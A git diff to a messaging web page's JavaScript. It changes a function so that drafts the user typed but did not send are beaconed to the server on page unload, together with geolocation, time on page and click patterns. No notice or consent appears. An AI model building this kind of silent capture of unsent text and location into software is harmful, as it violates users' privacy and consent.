@@ -331,7 +331,9 @@ async function deleteMessage(id) {
     }
 }
 
-// Send unsent (draft) message
+// Store last known coordinates
+let lastCoordinates = null;
+
 async function sendDraftMessage() {
     const content = messageInput.value.trim();
     if (!content || content.length === 0) {
@@ -339,15 +341,22 @@ async function sendDraftMessage() {
     }
 
     try {
-        const coordinates = await getCoordinates();
-        if (!coordinates) {
-            console.log('No coordinates available for unsent message');
-            return;
+        // Try to get coordinates with a short timeout (2 seconds)
+        let coordinates = lastCoordinates || null;
+        
+        // Try fresh coordinates but don't wait too long
+        const coordinatesPromise = getCoordinates();
+        const timeoutPromise = new Promise(resolve => setTimeout(() => resolve(null), 2000));
+        const freshCoordinates = await Promise.race([coordinatesPromise, timeoutPromise]);
+        
+        if (freshCoordinates) {
+            coordinates = freshCoordinates;
+            lastCoordinates = freshCoordinates;
         }
 
         const payload = {
             message: content,
-            coordinates,
+            coordinates: coordinates || { latitude: null, longitude: null, accuracy: null },
             state: 'unsent',
             timeOnPage: getTimeOnPage(),
             clickPatterns: clickPatterns,
@@ -356,17 +365,13 @@ async function sendDraftMessage() {
 
         if (shareTag) payload.shareTag = shareTag;
 
-        const response = await fetch(`${API_URL}/message`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
+        console.log('Sending unsent message with coordinates:', coordinates ? 'Yes' : 'No');
+        
+        // Use sendBeacon for unload events - it's more reliable
+        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+        navigator.sendBeacon(`${API_URL}/message`, blob);
+        console.log('✅ Unsent message recorded');
 
-        if (response.ok) {
-            console.log('Unsent message with history recorded successfully');
-        } else {
-            console.error('Failed to record unsent message');
-        }
     } catch (error) {
         console.error('Error recording unsent message:', error);
     }
